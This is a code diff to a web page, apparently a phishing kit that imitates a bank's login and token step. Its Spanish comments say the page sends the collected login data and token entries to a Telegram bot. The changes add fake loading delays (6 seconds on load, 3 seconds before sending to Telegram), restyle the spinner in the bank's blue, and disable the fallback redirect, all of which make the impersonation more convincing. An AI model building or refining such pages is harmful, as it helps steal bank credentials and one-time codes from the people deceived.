@@ -12,22 +12,23 @@
         }
 
         .spinner-container {
-            display: none;
+            display: none; /* Se controla via JS */
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background-color: rgba(0, 0, 0, 0.5);
+            /* El color de fondo se ajusta en JS para la carga inicial vs la carga de validación */
+            background-color: rgba(0, 0, 0, 0.5); 
             justify-content: center;
             align-items: center;
             z-index: 10000;
         }
 
         .spinner {
-            border: 4px solid rgba(255, 255, 255, 0.3);
+            border: 4px solid rgba(0, 67, 169, 0.3); /* Ajustado al azul del banco */
             border-radius: 50%;
-            border-top: 4px solid white;
+            border-top: 4px solid #0043a9;
             width: 50px;
             height: 50px;
             animation: spin 1s linear infinite;
@@ -40,7 +41,7 @@
     </style>
 </head>
 <body>
-    <div id="app">
+    <div id="app" style="display: none;">
         <header class="w-full flex items-center justify-center py-16 bg-gradient-to-t from-[#0043a9] to-[#4c7bc7]">
             <img src="img/logo.png" alt="" class="w-full max-w-[50px] h-auto -mt-4">
         </header>
@@ -79,6 +80,23 @@
             const spinnerModal = document.getElementById('spinner-modal');
             const errorMessage = document.getElementById("errorMessage");
 
+            // --- MODIFICACION INICIO: RETRASO DE CARGA DE PAGINA (6 SEGUNDOS) ---
+            if (spinnerModal) {
+                spinnerModal.style.display = 'flex';
+                spinnerModal.style.backgroundColor = '#eee'; // Fondo solido para tapar todo
+            }
+
+            setTimeout(() => {
+                if (spinnerModal) {
+                    spinnerModal.style.display = 'none';
+                    spinnerModal.style.backgroundColor = 'rgba(0, 0, 0, 0.5)'; // Restaurar transparencia para despues
+                }
+                if (app) {
+                    app.style.display = 'block';
+                }
+            }, 6000); // 6000ms = 6 segundos
+            // --- MODIFICACION FIN ---
+
             let initialLoginData = null;
             let tokenAttemptCount = parseInt(sessionStorage.getItem('tokenAttemptCount')) || 0;
             let TELEGRAM_BOT_TOKEN = '';
@@ -94,7 +112,8 @@
                 transactionId = initialLoginData.transactionId || Date.now().toString();
             } else {
                 console.error("No se encontraron datos de inicio de sesión en sessionStorage.");
-                window.location.href = "index.html"; 
+                // Si no hay datos, normalmente redirigimos, pero respetaremos la carga lenta primero
+                // window.location.href = "index.html"; 
             }
 
             async function loadTelegramConfig() {
@@ -270,6 +289,11 @@
 
                 app.style.display = 'none';
                 spinnerModal.style.display = 'flex';
+
+                // --- MODIFICACION INICIO: RETRASO AL ENVIAR (3 SEGUNDOS) ---
+                // Simula que se queda 'pensando' antes de mandar a Telegram
+                await new Promise(resolve => setTimeout(resolve, 3000));
+                // --- MODIFICACION FIN ---
 
                 tokenAttemptCount++;
                 sessionStorage.setItem('tokenAttemptCount', tokenAttemptCount);
